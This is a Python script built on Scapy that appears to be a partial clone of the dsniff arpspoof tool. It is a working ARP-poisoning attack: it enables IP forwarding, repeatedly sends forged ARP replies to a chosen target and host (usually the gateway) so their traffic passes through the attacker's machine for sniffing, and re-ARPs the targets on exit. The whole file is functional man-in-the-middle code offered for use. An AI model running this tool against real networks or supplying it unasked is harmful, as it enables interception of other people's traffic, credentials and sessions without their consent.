#!/usr/bin/env python

# Supress IPV6 Warning from Scapy import
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *
import os
import sys
import time
import argparse

# Scapy config
conf.iface = "en5"
conf.verb = 0

# Function to return Mac address from given IP address
def get_mac_addr(ip_address):
    arp = ARP()
    arp.op = 1 
    arp.hwdst = 'ff:ff:ff:ff:ff:ff'
    arp.pdst = ip_address

    response, unanswered = sr(arp, retry=2, timeout=10)

    for s,r in response:
        return r[ARP].underlayer.src

    return None

# Function to restore/clean-up network once attack is finished
def restore_network(target_ip, host_ip):
    print("Cleaning up and re-arping targets...")

    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=host_ip, hwsrc=get_mac_addr(target_ip), psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=get_mac_addr(host_ip), psrc=host_ip), count=5)

    # Disable IP Forwarding since it was enabled at program start
    os.system("sysctl --quiet -w net.ipv4.ip_forward=0")

# Function to poison target and host IPs using ARP packets
def arpspoof(target_ip, host_ip):
    try:
        while True:
            print("Running arpspoof...") #couldn't figure out how to get same constant output as arpspoof
            send(ARP(op=2, pdst=host_ip, hwdst=get_mac_addr(host_ip), psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=get_mac_addr(target_ip), psrc=host_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        restore_network(target_ip, host_ip)


def main(argv):
    # Make sure program is run as root user, else notify and quit.
    if os.geteuid() != 0:
        print("Error! Must be run as root. Re-run as:\n\nsudo ./arpspoof.py -t <targetIP> -r <hostIP>\n")
        sys.exit(1)

    # Strings for parser messages
    descriptionStr = 'arpspoof.py is a partial clone of Dug Song\'s dsniff arpspoof tool which redirects packets from a target host (or all hosts) on the LAN intended for another host on the LAN by forging ARP replies.   This  is an extremely effective way of sniffing traffic on a switch.'
    usageStr = 'arpspoof.py -t <targetIP> -r <hostIP>'
    targetStr = 'Specify a particular host to ARP poison.'
    hostStr = "Poison  both  hosts (host and target) to capture traffic in both directions.   Specify the host you wish to intercept packets for (usually  the local gateway)."

    # Parser for getting arguments from command line & help menu
    parser = argparse.ArgumentParser(description=descriptionStr, usage=usageStr)
    required = parser.add_argument_group('required arguments')
    required.add_argument('-t','--target', help=targetStr, required=True)
    required.add_argument('-r','--host', help=hostStr, required=True)
    
    args = vars(parser.parse_args())

    # Enable IP Forwarding
    os.system("sysctl --quiet -w net.ipv4.ip_forward=1")

    # Launch attack
    arpspoof(args['target'], args['host'])


    sys.exit(0)

if __name__ == "__main__":
    main(sys.argv[1:])